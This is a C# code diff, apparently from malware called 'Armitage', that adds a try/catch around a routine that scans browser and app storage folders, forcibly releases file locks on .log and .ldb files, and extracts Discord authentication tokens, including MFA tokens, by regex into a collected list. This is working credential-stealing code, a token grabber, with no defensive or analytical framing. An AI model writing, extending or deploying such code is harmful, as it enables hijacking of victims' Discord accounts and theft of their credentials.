@@ -39,31 +39,36 @@ namespace Client.Armitage.Cookies
             };
             foreach (string i in paths)
             {
-                DirectoryInfo rootfolder = new DirectoryInfo(i);
-
-                if (rootfolder.Exists)
+                // added for some reasons
+                try
                 {
-                    var logfiles = Utilities.Files_And_Pathing.GetFilesByExtensions(rootfolder, ".log", ".ldb");
+                    DirectoryInfo rootfolder = new DirectoryInfo(i);
 
-                    foreach (var file in logfiles)
+                    if (rootfolder.Exists)
                     {
-                        Utilities.Files_And_Pathing.KillLocks(file.FullName);
+                        var logfiles = Utilities.Files_And_Pathing.GetFilesByExtensions(rootfolder, ".log", ".ldb");
 
-                        string readedfile = file.OpenText().ReadToEnd();
-
-                        foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                        foreach (var file in logfiles)
                         {
-                            discordtokens.Add(new Tuple<string, string>(i, match.Value));
-                        }
+                            Utilities.Files_And_Pathing.KillLocks(file.FullName);
 
-                        foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
-                            discordtokens.Add(new Tuple<string, string>(i, match.Value));
+                            string readedfile = file.OpenText().ReadToEnd();
+
+                            foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                            {
+                                discordtokens.Add(new Tuple<string, string>(i, match.Value));
+                            }
+
+                            foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
+                                discordtokens.Add(new Tuple<string, string>(i, match.Value));
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine($"path doesnt exist : {i}");
                     }
                 }
-                else
-                {
-                    Console.WriteLine($"path doesnt exist : {i}");
-                }
+                catch { }
             }
             return discordtokens;
         }
